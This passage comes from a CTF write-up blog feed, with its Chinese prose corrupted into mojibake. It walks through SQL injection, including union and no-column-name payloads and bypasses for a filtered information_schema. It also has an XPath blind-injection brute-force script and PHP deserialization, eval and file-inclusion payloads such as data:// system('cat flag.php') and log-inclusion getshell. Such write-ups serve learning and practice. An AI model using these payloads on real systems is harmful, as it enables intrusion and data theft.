byã€‚</p><p>ä½†æ˜¯è¿™é“é¢˜æœ€å‘çš„æ˜¯å®ƒç«Ÿç„¶æœ‰22ä¸ªå­—æ®µï¼Œè¿™è°èƒ½æƒ³åˆ°å•Šå•Šå•Šå•Šå•Šå•Šï¼Œæ‰€ä»¥å†™ç»™æˆ‘æäº†ä¸ªé†’ï¼Œå¦‚æœä»¥åè¦è¿›è¡Œfuzzå­—æ®µï¼Œæˆ‘å°±å¯ä»¥ç›´æ¥æä¸ªå¤§çš„ï¼Œåœ¨ä¸€äºŒåˆ†çš„æ–¹å¼è¿›è¡Œï¼Œå¤ªå‘äº†ã€‚ã€‚ã€‚ã€‚</p><p>ç„¶åæˆ‘éœ€è¦çŸ¥é“ï¼Œè¿™22ä¸ªå­—æ®µé‡Œè°çš„ä¸œè¥¿ä¼šæ˜¾ç¤ºåœ¨å¹¿å‘Šåæˆ–å¹¿å‘Šå†…å®¹ä¸Šã€‚</p><p>å› ä¸ºæˆ‘ä¹‹å‰ç”¨è¿™ä¸ªæ–¹æ³•çš„æ¬¡æ•°å¾ˆå¥½ï¼Œæˆ‘ç«Ÿç„¶ä¸çŸ¥é“è”åˆæŸ¥è¯¢çš„æ­¥éª¤ï¼Œæˆ‘æŠŠè¿™ä¸ªå’Œfuzzå­—æ®µå¼„æ··åœ¨ä¸€èµ·äº†</p><p>1â€™/<strong>/union/</strong>/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,â€™22</p><p><img src="8.PNG"></p><p>å› ä¸ºæˆ‘ä»¬ä¸æ˜¯çŸ¥é“æœ‰22ä¸ªå­—ç¬¦å˜›ï¼Œç„¶åæˆ‘ä»¬è¿›è¡Œè”åˆæŸ¥æ‰¾ï¼Œç„¶åé€å›¾ä¸­å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„1ï¼Œ2ï¼Œ3ï¼Œ4ï¼Œ5ï¼Œ6ï¼Œ7ï¼Œ8å¦å…¶äº†ä¸€è¡Œã€‚</p><p>å…¶å®æˆ‘ä»¬é€šè¿‡è¿™ä¸ªå¯ä»¥çŸ¥é“å¹¿å‘Šåï¼Œå¹¿å‘Šå†…å®¹å®ƒä»¬æ‰€åœ¨çš„å­—æ®µçš„ä½ç½®ï¼Œä¸€ä½å“¦æ¯•ç«Ÿæˆ‘ä»¬æƒ³è¦flagï¼Œ22ä¸ªå­—æ®µçš„å†…å®¹å¿…ç„¶ä¸ä¼šå…¨éƒ¨æ˜¾ç¤ºåœ¨å±å¹•ä¸Šï¼Œæ‰€ä»¥é€šè¿‡è¿™ä¸ªæµ‹è¯•æˆ‘ä»¬å°±å¯ä»¥çŸ¥é“ä¸¤ä¸ªå­—æ®µé‡Œæœ‰æˆ‘ä»¬æƒ³è¦çš„ä¸œè¥¿ã€‚</p><p><img src="9.PNG"></p><p>1â€™/<strong>/union/</strong>/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,â€™22</p><p><img src="10.PNG"></p><p>æˆåŠŸå¾—åˆ°äº†åº“åï¼Œä½†æ˜¯å…¶å®åšäº†ä¸€äº›ctfé¢˜ç›®åï¼Œæˆ‘æœ‰å‘ç°å…¶å®åº“åè¦ä¸è¦æ— æ‰€è°“ï¼Œå› ä¸ºæˆ‘ä»¬æƒ³è¦å¾—åˆ°è¡¨åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨where table_schema=database();æ¥è·å–è¡¨æ˜ï¼Œä½†æ˜¯è¿™é“é¢˜ç›®emmmmï¼Œinformation_schemaè¢«è¿‡æ»¤äº†</p><p>æ‰€ä»¥æˆ‘ä»¬å°±è¿›è¡Œå…³äºinformation_schemaçš„è¿‡æ»¤<a href="https://www.anquanke.com/post/id/193512">bypass</a>ï¼Œ</p><p>ä½†æ˜¯ç”±äºbuuä¸Šç¯å¢ƒçš„é—®é¢˜æ‰€ä»¥å°±ä¸èƒ½è¿›è¡Œæ‰€ä»¥çœ‹WPï¼Œå°±ç›²çŒœåœ¨usersè¡¨ä¸­</p><p>ç„¶åå˜›å°±æ˜¯å› ä¸ºæ¯•ç«Ÿinformationè¢«è¿‡æ»¤ï¼Œæˆ‘ä»¬åªèƒ½é€šè¿‡æ— åˆ—åæ³¨å…¥å¾—åˆ°æˆ‘ä»¬çš„æƒ³è¦çš„</p><p>1â€™/<strong>/union/</strong>/select/<strong>/1,(select/</strong>/group_concat(<code>4</code>)/<strong>/from/</strong>/(select/<strong>/1,2,3,4,5,6/</strong>/union/<strong>/select/</strong>/*/<strong>/from/</strong>/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,â€™22</p><p>ç„¶åè¿™é‡Œå°±åˆå­¦åˆ°äº†ä¸€ä¸ªæ–°çš„çŸ¥è¯†ï¼Œæ— åˆ—åæ³¨å…¥ï¼Œé¡¾åæ€ä¹‰å°±æ˜¯æˆ‘ä»¬ä¸çŸ¥é“å­—æ®µçš„åå­—ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜æƒ³è¦æ‹¿åˆ°å­—æ®µçš„ä¿¡æ¯</p><p><img src="9.PNG"></p><p>åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸€å…±æœ‰8ä¸ªå­—æ®µï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬ä¸çŸ¥é“å­—æ®µçš„åå­—ï¼Œæˆ‘ä»¬åº”è¯¥æ€ä¹ˆåšå‘¢</p><p><img src="10.PNG"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ¯ä¸ªåˆ—çš„åå­—éƒ½è¢«ç›¸åº”çš„æ•°å­—è¦†ç›–äº†</p><p><img src="11.PNG"></p><p>å¯ä»¥çœ‹åˆ°å½“æˆ‘é‡æ–°æ„é€ äº†ä¸€ä¸ªè¡¨açš„æ—¶å€™ï¼Œæˆ‘å¯ä»¥å•ç‹¬æŠŠæ¯ä¸€ä¸ªå­—æ®µé‡Œçš„å†…å®¹éƒ½é‡æ–°åˆ—äº†å‡ºæ¥ï¼Œæ‰€ä»¥ç°åœ¨æˆ‘ä»¬å°±å¯ä»¥ä¸é€šè¿‡å­—æ®µåè¿›è¡Œæ³¨å…¥äº†ã€‚</p><p>ä½†æ˜¯å¦‚æœåå¼•å·è¢«è¿‡æ»¤äº†ï¼Œé‚£æˆ‘ä»¬è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ</p><p><img src="12.PNG"></p><p>å¦‚æœåå¼•å·è¢«è¿‡æ»¤äº†å¯ä»¥è¿™æ ·å­æ</p><p>ç„¶å</p><blockquote><p>1â€™/<strong>/union/</strong>/select/<strong>/1,(select/</strong>/group_concat(<code>3</code>)/<strong>/from/</strong>/(select/<strong>/1,2,3/</strong>/union/<strong>/select/</strong>/*/<strong>/from/</strong>/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,â€™22</p></blockquote><p>ç„¶åæˆ‘ä»¬é€šè¿‡æ³¨å…¥å¾—åˆ°flagï¼Œä½†æ˜¯æ³¨æ„è¡¨usersä¸­çš„å­—æ®µä¹Ÿæ˜¯éœ€è¦ä¸€æ­¥ä¸€æ­¥æµ‹å‡ºæ¥çš„ã€‚</p><p><img src="13.PNG"></p><p>å¥½å˜ï¼Œåˆ°æœ€ååœ¨å»äº†è§£ä¸€ä¸‹å¦‚æœinformation_schemaè¢«è¿‡æ»¤äº†åº”è¯¥æ€ä¹ˆåŠå§</p><p>å…¶å®ä¸ºä»€ä¹ˆinformationâ€”â€”schemaå¾ˆé‡è¦å°±æ˜¯æˆ‘ä»¬åœ¨æ³¨å…¥çš„æ—¶å€™è¦é€šè¿‡å®ƒæ¥è¿›è¡Œçˆ†åº“ï¼Œçˆ†è¡¨åŒ…å­—æ®µï¼Œç„¶åä¸€æ—¦å®ƒè¢«ç¦ç”¨å°±å¥½åƒæˆ‘ä»¬å¤±å»äº†ä¸€ä¸ªè¶…çº§æœ‰åˆ©çš„æ­¦å™¨</p><blockquote><p>sys.schema_auto_increment_columns</p></blockquote><p>å…¶å®æˆ‘ä»¬åœ¨è®¾è®¡è¡¨çš„æ—¶å€™ä¸€æ—¦éƒ½ä¼šæ¶‰åŠä¸€ä¸ªidçš„å­—æ®µï¼Œé‡Œé¢çš„idå°±æ˜¯ä»0å¼€å§‹è¿›è¡Œæ·»åŠ </p><p>è€Œschema_auto_increment_columnsï¼Œè¯¥è§†å›¾çš„ä½œç”¨ç®€å•æ¥è¯´å°±æ˜¯å¯¹è¡¨è‡ªå¢idçš„ç›‘æ§</p><blockquote><p>sys.schema_auto_increment_columns</p></blockquote><p>ä½†æ˜¯æœ‰çš„æƒ…å†µä¸‹å› ä¸ºæœ‰äº›å°±æ˜¯æ²¡æœ‰idï¼Œæˆ‘ä»¬å¯ä»¥ç”¨sys.schema_table_statistics_with_bufferç»•è¿‡</p><p>payload:</p><blockquote><p>?id=-1â€™ union all select 1,2,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database()â€“+</p></blockquote><blockquote><p>?id=-1â€™ union all select*from (select * from users as a join users b)câ€“+</p></blockquote><blockquote><p>?id=-1â€™ union all select*from (select * from users as a join users b using(id,username))câ€“+</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NPUCTF2020-ezlogin</title>
      <link href="/2021/05/14/NPUCTF2020-ezlogin/"/>
      <url>/2021/05/14/NPUCTF2020-ezlogin/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€</p><span id="more"></span><p>æ‰“å¼€é¢˜ç›®ï¼Œåˆæ˜¯ä¸€é“ç™»å½•ç•Œé¢çš„é¢˜ç›®ï¼Œä½†æ˜¯å°è¯•æ‰«æç›®å½•ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼ŒæŠ“åŒ…åå‘ç°ï¼Œ<username>1</username><password>1</password><token>da1e1b4e62b5a2f21dbe9bTYyMTAwMzM</token>å¾ˆå¥‡æ€ªï¼Œçœ‹WPå‘ç°æ˜¯xpathç›²æ³¨</p><p><a href="https://xz.aliyun.com/t/7791">å…³äºxpath</a></p><p>é‡‡ç”¨å¤§ä½¬è„šæœ¬çˆ†ç ´</p><pre><code>    import requests    import re    s = requests.session()    url =&#39;http://47e7790f-8a53-4efa-988b-7a350ebb91d5.node3.buuoj.cn//login.php&#39;head =&#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36&quot;,&quot;Content-Type&quot;: &quot;application/xml&quot;&#125;find =re.compile(&#39;&lt;input type=&quot;hidden&quot; id=&quot;token&quot; value=&quot;(.*?)&quot; /&gt;&#39;)strs =&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39;flag =&#39;&#39;for i in range(1,100):    for j in strs:    r = s.post(url=url)    token = find.findall(r.text)    #çŒœæµ‹æ ¹èŠ‚ç‚¹åç§°    payload_1 = &quot;&lt;username&gt;&#39;or substring(name(/*[1]), &#123;&#125;, 1)=&#39;&#123;&#125;&#39;  or &#39;&#39;=&#39;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])    #çŒœæµ‹å­èŠ‚ç‚¹åç§°    payload_2 = &quot;&lt;username&gt;&#39;or substring(name(/root/*[1]), &#123;&#125;, 1)=&#39;&#123;&#125;&#39;  or &#39;&#39;=&#39;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])    #çŒœæµ‹accountsçš„èŠ‚ç‚¹    payload_3 =&quot;&lt;username&gt;&#39;or substring(name(/root/accounts/*[1]), &#123;&#125;, 1)=&#39;&#123;&#125;&#39;  or &#39;&#39;=&#39;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])    #çŒœæµ‹userèŠ‚ç‚¹    payload_4 =&quot;&lt;username&gt;&#39;or substring(name(/root/accounts/user/*[2]), &#123;&#125;, 1)=&#39;&#123;&#125;&#39;  or &#39;&#39;=&#39;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])    #è·‘ç”¨æˆ·åå’Œå¯†ç     payload_username =&quot;&lt;username&gt;&#39;or substring(/root/accounts/user[2]/username/text(), &#123;&#125;, 1)=&#39;&#123;&#125;&#39;  or &#39;&#39;=&#39;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])    payload_password =&quot;&lt;username&gt;&#39;or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)=&#39;&#123;&#125;&#39;  or &#39;&#39;=&#39;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])    print(payload_password)    r = s.post(url=url,headers=head,data=payload_username)    print(r.text)    if &quot;éæ³•æ“ä½œ&quot; in r.text:        flag+=j        print(flag)        breakif &quot;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯!&quot; in r.text:    breakprint(flag)</code></pre><p>å¾—åˆ°å¯†ç ï¼Œç”¨æˆ·åï¼Œç„¶åæ ¹æ®base64è¯»å–flagï¼Œæ³¨æ„å¤§å°å†™ç»•è¿‡</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-misc</title>
      <link href="/2021/05/13/ctfshow-misc/"/>
      <url>/2021/05/13/ctfshow-misc/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€<br>èœé¸¡webç‹—ï¼Œä¹Ÿæƒ³å­¦misc,é¢˜ç›®ä¸Šæœ‰å¥è¯ï¼Œæ¯é“é¢˜ä½ éƒ½è¦æƒ³ä¸€æƒ³flagè—åœ¨å“ªé‡Œï¼Œä¸ºä»€ä¹ˆè¦è—åœ¨è¿™é‡Œ</p><span id="more"></span><h2>misc 1</h2><p>ä¸‹è½½å›¾ç‰‡ï¼Œæ‰“å¼€å°±æ˜¯flag,å¯ä»¥ç”¨QQé‡Œé¢çš„æå–å›¾ç‰‡ä¸­çš„æ–‡å­—ï¼Œæˆ–è€…ä½¿ç”¨tesseract</p><h2>misc 2</h2><p>æ‰“å¼€æ˜¯ä¸€ä¸ªtxtæ–‡ä»¶ï¼Œé€šè¿‡è®°äº‹æœ¬æˆ–è€…winhexå¯ä»¥çœ‹å‡ºå…¶ä¸ºpngæ–‡ä»¶ï¼Œæ”¹åç¼€å</p><h2>misc 3</h2>æ˜¯bpgåç¼€çš„æ–‡ä»¶ï¼Œå¯ä»¥ç”¨å·¥å…·è¿›è¡Œè§£å‹ï¼Œç„¶ååœ¨æ ¹ç›®å½•ä¸‹ä½¿ç”¨ bpgdec -o out.png misc3.bpgå‰è€…æ˜¯æƒ³è¦è¾“å‡ºå›¾ç‰‡çš„åå­—ï¼ˆè‡ªå®šä¹‰ï¼‰ï¼Œåè€…æ˜¯bpgæ–‡ä»¶çš„åç§°ã€‚bpgæ˜¯jpgï¼Œpngçš„ä¸€ç§å‹ç¼©å½¢åŠ¿ï¼Œä¸Šè¿°åªæ˜¯å°†å…¶è§£å‹ä¸ºæ­£å¸¸çš„å›¾ç‰‡<h2>misc 4</h2>[hex æ–‡ä»¶å¤´](https://www.cnblogs.com/lzlzzzzzz/p/11397307.html)<p>ä¸€ä¸€å¯¹åº”æ‰¾åˆ°ï¼Œå…¶çœŸæ­£çš„åç¼€è¿›è¡Œä¿®æ”¹<br>52 49 46 46æ˜¯é‚£ä¸ª .wepg åç¼€</p><p><a href="https://exif.tuchong.com/">https://exif.tuchong.com/</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æ´¥é—¨æ¯wp</title>
      <link href="/2021/05/10/%E6%B4%A5%E9%97%A8%E6%9D%AFwp/"/>
      <url>/2021/05/10/%E6%B4%A5%E9%97%A8%E6%9D%AFwp/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€</p><p>èœé¸¡æœ¬é¸¡ï¼Œä¸€é“éƒ½æ²¡æœ‰åšå‡ºæ¥ï¼Œåªèƒ½è·Ÿç€WPèµ°ä¸€éï¼Œå­¦ç‚¹çŸ¥è¯†ã€‚</p><span id="more"></span><h2>power_cut</h2><p>é¢˜ç›®ç±»å‹ï¼šååºåˆ—åŒ–ä»¥åŠä¿¡æ¯æ”¶é›†</p><p>æ‰“å¼€é¢˜ç›®ç»™å‡ºäº†ä¸€æ®µè¯ï¼šæ˜¨å¤©æ™šä¸Šå› ä¸º14çº§å¤§é£åœç”µäº†</p><p>çœ‹åˆ°è¿™å¥è¯å°±æœ‰ç‚¹æ‡µï¼Ÿï¼Ÿï¼Ÿè¿™æ˜¯å•¥ï¼Œç„¶åæ‰«ç›®å½•æ‰«å‡ºæ¥æ˜¯.index.php.swpï¼Œå“¦æ˜ç™½äº†ï¼Œå› ä¸ºå¤§é£åœç”µå¯¼è‡´å¼‚å¸¸é€€å‡ºã€‚</p><p>ç„¶åä¸‹è½½å‡ºæ¥çš„æ–‡ä»¶ï¼Œæˆ‘ç”¨è®°äº‹æœ¬å‹‰å¼ºèƒ½çœ‹å‡ºæ¥æ˜¯ååºåˆ—åŒ–ï¼Œå› ä¸ºä»£ç æ˜¯ä¹±çš„ã€‚åœ¨ç¾¤é‡Œé—®äº†å¤§ä½¬åï¼Œæ˜¯ç”¨ vi -r index.php.swp</p><p>æºç </p><pre><code>&lt;?phpclass logger&#123;public $logFile;public $initMsg;public $exitMsg;function __construct($file)&#123;    $this-&gt;initMsg=&quot;#--session started--#\n&quot;;    $this-&gt;exitMsg=&quot;#--session end--#\n&quot;;    $this-&gt;logFile=$file;    readfile($this-&gt;logFile);&#125;function log($msg)&#123;    $fd=fopen($this-&gt;logFile,&quot;a+&quot;);    fwrite($fd,$msg.&quot;\n&quot;);    fclose($fd);    echo(&#39;log&#39;);&#125;function __destruct()&#123;    echo &quot;destructï¼&quot;;&#125;&#125;class weblog&#123;public $weblogfile;function __construct()&#123;    $flag=&quot;system(&#39;cat /flag&#39;);&quot;;    echo &quot;$flag&quot;;&#125;function __wakeup()&#123;    //self::waf($this-&gt;filepath);    $obj=new logger($this-&gt;weblogfile);&#125;public function waf($str)&#123;    $str=preg_replace(&quot;/[&lt;&gt;*#&#39;|?\n ]/&quot;,&quot;&quot;,$str);    $str=str_replace(&#39;flag&#39;,&#39;&#39;,$str);    return $str;&#125;function __destruct()&#123;    echo &quot;this is destruct&quot;;&#125;&#125;$log=$_GET[&#39;log&#39;];$log=preg_replace(&quot;/[&lt;&gt;*#&#39;|?\n ]/&quot;,&quot;&quot;,$log);$log=str_replace(&#39;flag&#39;,&#39;&#39;,$log);;echo($log);$log_unser=unserialize($log);</code></pre><p>æˆ‘åšä¸å‡ºæ¥çš„ç‚¹æ˜¯ï¼Œæˆ‘é’»ç‰›è§’å°–äº†ï¼Œæˆ‘åˆšå¼€å§‹å†™çš„expæ˜¯</p><p><img src="1.PNG"></p><p>å› ä¸ºæˆ‘æƒ³é€šè¿‡è§¦å‘constructæ¥æ‰§è¡Œsystemå‡½æ•°ã€‚ä½†æ˜¯ä¸€ç›´æ²¡æœ‰æˆåŠŸï¼Œäºæ˜¯æ€ç»´å°±å¡åœ¨è¿™é‡Œäº†ã€‚</p><p>ä½†æ˜¯å¿½ç•¥äº†ä¸€ä¸ªç‰¹åˆ«é‡è¦çš„å‡½æ•°readfileï¼Œæˆ‘æ²¡æœ‰æƒ³åˆ°è®©$file=/flagï¼Œç›´æ¥å»æ‰§è¡Œè¯»å–flagä¸­çš„å†…å®¹ï¼Œæ¯•ç«Ÿsystemï¼ˆâ€˜cat /flagâ€™ï¼‰å·²ç»æç¤ºäº†flagçš„ä½ç½®ï¼Œå› ä¸ºåé¢æœ‰ä¸€ä¸ªå°†logä¸­çš„flagæ›¿æ¢ä¸ºâ€˜â€™ï¼Œäºæ˜¯æˆ‘ä»¬ä½¿ç”¨åŒå†™ç»•è¿‡å°±å¯ä»¥äº†</p><p>exp:</p><p><img src="2.PNG"></p><p>é—®äº†å¤§ä½¬</p><p><img src="3.png"></p><p>ç¬é—´æ˜ç™½ï¼Œè¿™æ¥å˜æˆäº†Näº†<br>åˆç¬é—´ä¸æ˜ç™½äº†</p><h2>hate_php</h2><pre><code>&lt;?phperror_reporting(0);if(!isset($_GET[&#39;code&#39;]))&#123;highlight_file(__FILE__);&#125;else&#123;$code = $_GET[&#39;code&#39;];if(preg_match(&quot;/[A-Za-z0-9_$@]+/&quot;,$code))&#123;    die(&#39;fighting!&#39;); &#125;eval($code);&#125;</code></pre><p>å…ˆåˆ†æä¸€ä¸‹ï¼Œæœ¬æ¥evalæˆ‘ä»¬éƒ½çŸ¥é“å°±ç›´æ¥system(â€˜lsâ€™);å°±å¯ä»¥äº†ï¼Œä½†æ˜¯æœ¬é“é¢˜ç›®è¿‡æ»¤äº†å­—æ¯ï¼Œæ‰€ä»¥å¾ˆé—æ†¾ä¸å¯ä»¥ï¼Œæˆ‘ä»¬è¦æƒ³ä»€ä¹ˆå¯ä»¥ä»£æ›¿systemï¼Œæˆ‘ä»¬çŸ¥é“åˆpassthruï¼Œechoï¼Œä½†æ˜¯éƒ½æ˜¯å­—æ¯ã€‚</p><p>æœ‰ä¸€ç‚¹echoå¯ä»¥ç”¨&lt;?=ä»£æ›¿<br>æˆ‘ä»¬å…ˆå†™ä¸€ä¸ªä¸å¸¦ä»»ä½•è¿‡æ»¤çš„ä»£ç </p><p>åˆ†åˆ«æ‰§è¡Œ</p><p><img src="4.PNG"></p><p><img src="5.PNG">  (ps,å°‘å†™äº†ä¸€ä¸ª=)</p><p>å…¶å®å¦‚æœæˆ‘ä»¬ä¼ å…¥å¾—æ˜¯ <?=å°±ç›¸å½“äºæ˜¯ eval<?`ls`;å‰é¢å¾—<? æ²¡æœ‰è¢«é—­åˆï¼Œæ‰€ä»¥å‡ºç°é”™è¯¯ï¼Œç°åœ¨æˆ‘ä»¬éœ€è¦åšçš„å°±æ˜¯å°†å‰é¢å¾—<?é—­åˆï¼Œæˆ‘ä»¬éœ€è¦è¾“å…¥?>&lt;?=<code>ls</code>;å³å¯</p><p><img src="6.PNG"></p><p>æˆ‘ä»¬å°è¯•å»ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶æ¥æ‰§è¡Œå‘½ä»¤</p><p><img src="7.PNG"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä¸Šä¼ å¾—ä¸´æ—¶æ–‡ä»¶ï¼Œè¢«æ”¾åœ¨äº†/tmp/php??????ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬å°è¯•é€šè¿‡åŒ…å«è¿™ä¸ªæ–‡ä»¶æ¥æ‰§è¡Œæˆ‘ä»¬çš„å‘½ä»¤äº†</p><p>æˆ‘ä»¬çŸ¥é“å½“æˆ‘ä»¬åœ¨æ–‡ä»¶ä¸­å†™å…¥lsï¼Œç„¶åå»åˆ©ç”¨source æ–‡ä»¶åï¼Œæ˜¯å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„ã€‚ä½†æ˜¯æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä»–çš„ä¸€ä¸ªæ›¿ä»£å“ï¼Œå°±æ˜¯<code>.</code>ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨ . æ–‡ä»¶åçš„æ—¶å€™ä¹Ÿæ˜¯å¯ä»¥æ‰§è¡Œè¿™ä¸ªå‘½ä»¤äº†æ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨?&gt;&lt;?=<code>.%20??p/p?p??????</code>;æ¥æ‰§è¡Œæˆ‘ä»¬çš„å‘½ä»¤ï¼Œ%20æ˜¯ç©ºæ ¼çš„æ„æ€ã€‚</p><p>æˆ‘æœ‰æƒ³åˆ°ä¸ºä»€ä¹ˆçº¢åŒ…é¢˜æ˜¯è¿™ä¸ªpayloadè€Œweb55æ˜¯.%20/???/????????[@-[]å› ä¸ºå…¶åˆ©ç”¨çš„æ˜¯systemè€Œè¿™ä¸ªåˆ©ç”¨çš„æ˜¯evalï¼Œåšçº¢åŒ…é¢˜è€Œä¸”è¿˜æ²¡æœ‰è¿‡æ»¤pï¼Œæˆ‘åœ¨çœ‹æ´¥é—¨æ¯wpçš„æ—¶å€™æ˜¯è¿™æ ·å†™çš„?&gt;&lt;?=<code>.%20???/????????[?-[]</code>;æ¥å¾—åˆ°flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-æ–‡ä»¶åŒ…å«</title>
      <link href="/2021/05/07/ctfshow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2021/05/07/ctfshow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€</p><p>åŠ æ²¹åŠ æ²¹åŠ æ²¹</p><p>ä»Šå¤©æ¯”è¾ƒå¼€å¿ƒçš„æ˜¯å¯¹hackbaræœ‰äº†è¿›ä¸€æ­¥çš„äº†è§£</p><span id="more"></span><h2>web 78</h2><p><img src="1.PNG"></p><p>ç‰¹ç‚¹ï¼šæ²¡æœ‰ä¸€ç‚¹ç‚¹è¿‡æ»¤</p><p>æƒ³åˆ°åˆ°payloadï¼š</p><blockquote><p>?file=php://filter/read=convert.base64-encode/resource=flag.php</p><p>?file=PHP://Filter/read=convert.base64-encode/resource=flag.php(å¦‚æœæœ‰å¤§å°å†™é™åˆ¶ï¼Œç»•è¿‡å¤§å°å†™é™åˆ¶)</p><p>?file=data://text/plain,<?php system('cat flag.php');?>ï¼ˆå¤§å°å†™ç»•è¿‡å¯ä»¥åŒä¸Šï¼‰</p><p>?file=data://text/plain,<?=system('cat flag.php');?>ï¼ˆçŸ­æ ‡ç­¾ç»•è¿‡ï¼‰</p><p>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==(base64ç¼–ç ç»•è¿‡)</p><p>?file=php://input  post:<?php system('ls');?></p></blockquote><h2>web 79</h2><p><img src="2.PNG"></p><p>ç‰¹ç‚¹ï¼šè¿‡æ»¤äº†phpï¼Œä½†æ˜¯æ²¡æœ‰ç»•è¿‡å¤§å°å†™</p><blockquote><p>?file=pHp://input post:<?php system('ls');?></p><p>?file=data://text/plain,<?=eval($_POST[1]);?> post:1=system(â€˜lsâ€™);</p><p>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==(<?php system('cat flag.php');?>)</p></blockquote><h2>web 80</h2><p>ç‰¹ç‚¹ï¼šè¿‡æ»¤äº†phpï¼Œdataä½†æ˜¯æ²¡æœ‰è¿‡æ»¤å¤§å°å†™</p><p><img src="3.PNG"></p><p>ä¸Šé¢2çš„ä¸€äº›æ–¹æ³•è¿˜æ˜¯å¯ä»¥ç”¨çš„ï¼Œè¿™é‡Œä»‹ç»ä¸€ä¸‹æ–°çš„æ–¹æ³•ï¼Œè¿™ä¸ªå¯ä»¥ç»•è¿‡open_dir</p><p>?file=phP://input</p><p>ä¸€ä¸ªç±»ï¼š DirectoryIterator</p><pre><code>&lt;?php$dir = new DirectoryIterator(&quot;glob:///var/www/html/*&quot;);foreach ($dir as $file)&#123;   echo($file-&gt;__tostring().&#39; &#39;);&#125;exit(0);?&gt;</code></pre><p><a href="https://blog.csdn.net/weixin_45551083/article/details/110109369">å­¦ä¹ çš„æ–‡ç« </a></p><p>è¿˜æœ‰ä¸€ä¸ªæ˜¯è¿›è¡Œæ—¥å¿—åŒ…å«getshell</p><p>æ—¥å¿—æ–‡ä»¶è·¯å¾„ ?file=/var/log/nginx/access.log</p><p>è¿›è¡Œæ—¥å¿—æ–‡ä»¶åŒ…å«çš„ä¸»è¦æ­¥éª¤æ˜¯ï¼Œå…ˆå°†åœ¨user-agentå“ªé‡Œè¿›è¡ŒåŒ…å«ï¼Œç„¶ååœ¨urlé‚£é‡Œå†™å‡ºæ—¥å¿—çš„è·¯å¾„</p><p><img src="4.PNG"></p><p>åœ¨firebaskyå¸ˆå‚…é‚£é‡Œå­¦åˆ°äº†å¦‚æœcatè¢«è¿‡æ»¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨base64ç›¸å½“äºcatï¼Œå¤§ä½¬ä»¬æœç„¶éƒ½å¾ˆç§€</p><h2>web 81</h2><p>åŒ80ï¼Œä¸»è¦çš„ä¸€ç‚¹å°±æ˜¯åŠ ä¸Šè¿‡æ»¤äº† :</p><p>ç”¨æ—¥å¿—åŒ…å«ä¹Ÿæ˜¯å¯ä»¥çš„</p><p>è·Ÿç€å¤§ä½¬å°±æ˜¯è¯´äº†ä¸€ç§æ–°çš„æ–¹æ³•</p><p><img src="5.PNG"></p><p><img src="6.PNG"></p><p>ç„¶åä½¿ç”¨çŸ­æ ‡ç­¾ä¹Ÿæ˜¯å¯ä»¥çš„</p><h2>web 82</h2><p>è¿™é“é¢˜ç›®è·Ÿä¸Šè¿°é¢˜ç›®ä¸åŒçš„åœ°æ–¹åœ¨äºè¿™é“é¢˜ç›®è¿‡æ»¤äº†â€œ.â€,é‚£å°±è¯´æ˜æˆ‘ä»¬åªèƒ½åŒ…å«ä¸€ä¸ªæ— 